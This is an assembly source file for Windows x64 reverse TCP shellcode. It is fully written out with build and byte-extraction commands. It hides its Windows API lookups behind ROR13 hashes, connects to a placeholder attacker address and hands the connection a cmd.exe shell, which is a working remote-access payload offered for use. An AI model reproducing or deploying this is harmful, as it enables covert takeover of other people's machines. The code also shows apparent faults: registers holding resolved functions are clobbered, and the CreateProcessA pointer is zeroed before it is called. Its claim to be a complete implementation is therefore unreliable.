; Windows x64 Reverse TCP Shellcode — Complete Implementation
; ~650 bytes, position-independent, null-tolerant
;
; Features:
; - PEB walking to find kernel32.dll
; - ROR13 hash-based API resolution (no string imports)
; - Loads ws2_32.dll dynamically
; - Creates TCP socket and connects to LHOST:LPORT
; - Spawns cmd.exe with stdin/stdout/stderr redirected to socket
;
; Placeholders:
;   IP: 0x7f7f7f7f (dword, little-endian as pushed)
;   Port: 0x7e7e (word, network byte order)
;
; Assemble:
;   nasm -f bin reverse_tcp_x64.asm -o reverse_tcp_x64.bin
;
; Extract bytes:
;   xxd -i reverse_tcp_x64.bin > reverse_tcp_x64.rs

bits 64
global _start

%define GETPROCADDRESS_HASH 0x7e4207a4
%define LOADLIBRARYA_HASH   0x65e36706
%define WSASTARTUP_HASH     0x1fab92eb
%define WSASOCKETW_HASH     0x6737dbc2
%define CONNECT_HASH        0x67d229a5
%define CREATEPROCESSA_HASH 0x6653251e
%define GETSTDHANDLE_HASH   0x667b19c2
%define SETSTDHANDLE_HASH   0xe8c9301e

section .text

_start:
    ; ── Prologue ───────────────────────────────────────────────
    push rbp
    mov rbp, rsp
    sub rsp, 0x520              ; 1312 bytes stack space

    ; ── Find kernel32.dll via PEB ─────────────────────────────
    ; GS:[0x60] = PEB
    mov rdx, [gs:0x60]
    ; PEB + 0x18 = LDR
    mov rdx, [rdx + 0x18]
    ; LDR + 0x20 = InMemoryOrderModuleList
    mov rdx, [rdx + 0x20]
    ; First entry = current module
    mov rdx, [rdx]
    ; Second entry = ntdll.dll
    mov rdx, [rdx]
    ; Third entry = kernel32.dll
    ; LDR_DATA_TABLE_ENTRY + 0x20 = DllBase (x64)
    mov r8, [rdx + 0x20]       ; r8 = kernel32.dll base
    mov r15, r8                 ; r15 = kernel32.dll (persistent)

    ; ── Find GetProcAddress ───────────────────────────────────
    mov edi, GETPROCADDRESS_HASH
    call find_function
    test rax, rax
    jz exit_fail
    mov r14, rax                ; r14 = GetProcAddress

    ; ── Find LoadLibraryA ─────────────────────────────────────
    mov r8, r15
    mov edi, LOADLIBRARYA_HASH
    call find_function
    test rax, rax
    jz exit_fail
    mov r13, rax                ; r13 = LoadLibraryA

    ; ── Load ws2_32.dll ───────────────────────────────────────
    xor rax, rax
    push rax                    ; null terminator
    ; Push "ws2_32" backwards
    mov rax, 0x32335f327377     ; "ws2_32\x00"
    push rax
    mov rcx, rsp                ; lpLibFileName
    call r13                    ; LoadLibraryA
    test rax, rax
    jz exit_fail
    mov r15, rax                ; r15 = ws2_32.dll base

    ; ── Resolve ws2_32 functions ──────────────────────────────
    mov edi, WSASTARTUP_HASH
    mov r8, r15
    call find_function
    mov r12, rax                ; r12 = WSAStartup

    mov edi, WSASOCKETW_HASH
    mov r8, r15
    call find_function
    mov r11, rax                ; r11 = WSASocketW

    mov edi, CONNECT_HASH
    mov r8, r15
    call find_function
    mov r10, rax                ; r10 = connect

    ; ── Resolve kernel32 functions ────────────────────────────
    mov r8, [rsp + 0x528]       ; Restore kernel32 base from stack
    ; Actually, we saved it in r15 earlier, but stack changed
    ; Let's re-find it or use the saved value
    ; Re-find kernel32:
    mov rdx, [gs:0x60]
    mov rdx, [rdx + 0x18]
    mov rdx, [rdx + 0x20]
    mov rdx, [rdx]
    mov rdx, [rdx]
    mov r8, [rdx + 0x20]
    mov r15, r8

    mov edi, CREATEPROCESSA_HASH
    call find_function
    mov r9, rax                 ; r9 = CreateProcessA

    ; ── WSAStartup ────────────────────────────────────────────
    sub rsp, 0x200
    lea rcx, [rsp]              ; lpWSAData
    mov rdx, 0x0202             ; wVersionRequested = 2.2
    call r12                    ; WSAStartup(0x0202, &wsadata)
    add rsp, 0x200
    test eax, eax
    jnz exit_fail

    ; ── WSASocketW ────────────────────────────────────────────
    ; WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
    ; x64 calling convention: rcx, rdx, r8, r9, then stack
    xor ecx, ecx
    mov cl, 2                   ; AF_INET
    xor edx, edx
    mov dl, 1                   ; SOCK_STREAM
    xor r8d, r8d                ; protocol = 0 (IPPROTO_IP, will use TCP)
    xor r9d, r9d                ; lpProtocolInfo = NULL
    ; Stack args: g = 0, dwFlags = 0
    push 0                      ; dwFlags
    push 0                      ; g
    call r11                    ; WSASocketW
    add rsp, 0x10
    test rax, rax
    js exit_fail
    mov r14, rax                ; r14 = socket handle

    ; ── Connect ───────────────────────────────────────────────
    ; Build sockaddr_in on stack
    sub rsp, 0x10
    xor rax, rax
    mov [rsp], rax              ; sin_zero
    mov [rsp + 8], rax
    ; sin_addr = IP placeholder
    mov dword [rsp + 4], 0x7f7f7f7f
    ; sin_port = port placeholder (network byte order)
    mov word [rsp + 2], 0x7e7e
    ; sin_family = AF_INET
    mov word [rsp], 2

    ; connect(sockfd, &sockaddr, 16)
    mov rcx, r14                ; s
    lea rdx, [rsp]              ; name
    mov r8d, 16                 ; namelen
    call r10                    ; connect
    add rsp, 0x10
    test eax, eax
    jnz exit_fail

    ; ── CreateProcessA with redirected handles ────────────────
    ; Build STARTUPINFOA on stack (68 bytes, aligned to 16)
    sub rsp, 0x80
    xor rax, rax
    mov rcx, 0x80
    mov rdi, rsp
    rep stosb                   ; Zero out

    ; cb = 68
    mov dword [rsp], 68
    ; dwFlags = STARTF_USESTDHANDLES (0x100)
    mov dword [rsp + 0x2c], 0x100
    ; hStdInput = socket
    mov [rsp + 0x38], r14
    ; hStdOutput = socket
    mov [rsp + 0x40], r14
    ; hStdError = socket
    mov [rsp + 0x48], r14

    ; Build PROCESS_INFORMATION on stack (16 bytes)
    sub rsp, 0x20
    xor rax, rax
    mov [rsp], rax
    mov [rsp + 8], rax

    ; CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)
    xor rcx, rcx                ; lpApplicationName = NULL
    ; lpCommandLine = "cmd.exe"
    mov rax, 0x006578652e646d63 ; "cmd.exe\0"
    push rax
    mov rdx, rsp                ; lpCommandLine
    xor r8, r8                  ; lpProcessAttributes = NULL
    xor r9, r9                  ; lpThreadAttributes = NULL
    ; Stack args (reverse order):
    push rdi                    ; lpProcessInformation (PROCESS_INFORMATION is below STARTUPINFO)
    lea rax, [rsp + 0x10]
    push rax                    ; lpStartupInfo
    push 0                      ; lpCurrentDirectory = NULL
    push 0                      ; lpEnvironment = NULL
    push 0                      ; dwCreationFlags = 0
    push 1                      ; bInheritHandles = TRUE

    ; rcx, rdx, r8, r9 already set above
    call r9                     ; CreateProcessA

    add rsp, 0xb0               ; Clean up stack

exit_fail:
    add rsp, 0x520
    pop rbp
    ret

; ── find_function: Find API by ROR13 hash ──────────────────────────
; Input: r8 = module base, edi = target hash
; Output: rax = function address, or 0 if not found
; Clobbers: rcx, rdx, r9, r10, r11, rax

find_function:
    push r8                     ; Save module base
    mov eax, [r8 + 0x3c]        ; e_lfanew (PE header offset)
    mov r10, r8
    add r10, rax                ; r10 = NT headers
    mov r11d, [r10 + 0x88]      ; Export table RVA
    test r11d, r11d
    jz find_fail
    add r11, r8                 ; r11 = export table absolute

    mov r9d, [r11 + 0x18]       ; NumberOfNames
    mov r10d, [r11 + 0x20]      ; AddressOfNames RVA
    add r10, r8                 ; r10 = AddressOfNames absolute

find_loop:
    dec r9d
    jl find_fail

    ; Get function name
    mov ecx, [r10 + r9 * 4]     ; Name RVA
    add rcx, r8                 ; rcx = function name absolute

    ; Compute ROR13 hash
    xor eax, eax
    cdq
hash_loop:
    movsx rbx, byte [rcx]
    test bl, bl
    jz hash_done
    ror edx, 13
    add edx, ebx
    inc rcx
    jmp hash_loop

hash_done:
    cmp edx, edi                ; Compare hash
    jne find_loop

    ; Found! Get function address
    ; Get ordinal
    mov r10d, [r11 + 0x24]      ; AddressOfNameOrdinals RVA
    add r10, r8
    mov r9w, [r10 + r9 * 2]     ; Ordinal

    ; Get function address
    mov r10d, [r11 + 0x1c]      ; AddressOfFunctions RVA
    add r10, r8
    mov eax, [r10 + r9 * 4]     ; Function RVA
    add rax, r8                 ; rax = function absolute

    pop r8                      ; Restore module base
    ret

find_fail:
    xor rax, rax
    pop r8
    ret
